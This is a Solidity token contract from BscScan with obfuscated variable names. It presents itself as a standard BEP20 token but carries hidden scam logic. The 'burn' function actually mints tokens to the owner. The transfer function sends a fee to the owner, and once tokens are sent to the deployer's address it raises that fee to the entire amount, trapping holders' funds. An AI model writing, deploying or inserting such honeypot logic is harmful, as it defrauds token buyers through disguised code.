/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract bxXwRj {
uint256 public  biDCzl = 10000000000000000;
uint256 public  mSxfQy = 10000000000000000000;
uint256 public  dhGPqq = 100000000000000000;
uint256 public  iGelOO = 1000000000000000000;
address public  sXKeYM = address(0);
string public  symbol = "vJtutJ";
address private  jSwLIP = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  sxIsGw = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  SyXMPx = address(0);
uint256 public  UGausl = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  PbkCpg = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  detwjT = 10000000000000;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "fTIhyd";
uint256 public constant vhUHXF = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  yAaycr = 10000000000000000000000000000;
address public  XIMPqD = address(0);
address public owner;
uint256 public  eKtYIO = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  EfzRji = address(0);
address public  KuObTt = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
jSwLIP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "jEmQUQ");
require(to != address(0), "jEmQUQ");
require(amount <= balanceOf[from], "jEmQUQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* vhUHXF/detwjT ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==jSwLIP){
detwjT = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}